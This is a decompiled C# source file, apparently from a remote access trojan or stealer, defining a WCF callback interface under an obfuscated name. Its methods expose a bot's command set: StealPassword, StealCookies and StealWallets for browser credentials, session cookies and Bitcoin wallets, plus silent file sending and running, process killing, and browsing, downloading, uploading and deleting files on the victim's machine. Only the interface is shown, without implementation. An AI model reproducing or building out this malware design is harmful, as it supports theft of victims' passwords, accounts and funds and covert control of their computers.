using System;
using System.Collections.Generic;
using System.ServiceModel;
using System.Threading.Tasks;
using MainModule;
using MainModule.Classes;

namespace Dodjins
{
	// Token: 0x02000010 RID: 16
	public interface Callbacie81ks
	{
		// Token: 0x06000058 RID: 88
		[OperationContract(IsOneWay = true)]
		Task BeginTransferImage();

		// Token: 0x06000059 RID: 89
		[OperationContract(IsOneWay = true)]
		Task StopTransferImage();

		// Token: 0x0600005A RID: 90
		[OperationContract(IsOneWay = true)]
		Task DeleteBot();

		// Token: 0x0600005B RID: 91
		[OperationContract(IsOneWay = false)]
		Task<UserLog> StealPassword();

		// Token: 0x0600005C RID: 92
		[OperationContract(IsOneWay = false)]
		Task<List<BrowserCookie>> StealCookies();

		// Token: 0x0600005D RID: 93
		[OperationContract(IsOneWay = false)]
		Task<List<BitcoinWallet>> StealWallets();

		// Token: 0x0600005E RID: 94
		[OperationContract(IsOneWay = false)]
		Task<bool> SendFile(byte[] file, string name, bool silient, string args);

		// Token: 0x0600005F RID: 95
		[OperationContract(IsOneWay = false)]
		Task<bool> ClearCookie();

		// Token: 0x06000060 RID: 96
		[OperationContract(IsOneWay = false)]
		Task<List<ProcessInfo>> LoadProcesses();

		// Token: 0x06000061 RID: 97
		[OperationContract(IsOneWay = false)]
		Task<bool> KillProcess(int id);

		// Token: 0x06000062 RID: 98
		[OperationContract(IsOneWay = false)]
		Task<string[]> RootDrives();

		// Token: 0x06000063 RID: 99
		[OperationContract(IsOneWay = false)]
		Task<List<FileInformation>> DirInfo(string path);

		// Token: 0x06000064 RID: 100
		[OperationContract(IsOneWay = false)]
		Task<byte[]> DownloadFile(string file);

		// Token: 0x06000065 RID: 101
		[OperationContract(IsOneWay = false)]
		Task<bool> UploadFile(byte[] file, string filePath);

		// Token: 0x06000066 RID: 102
		[OperationContract(IsOneWay = false)]
		Task<bool> RemoveFile(string path);

		// Token: 0x06000067 RID: 103
		[OperationContract(IsOneWay = false)]
		Task<bool> RunFile(string path);
	}
}
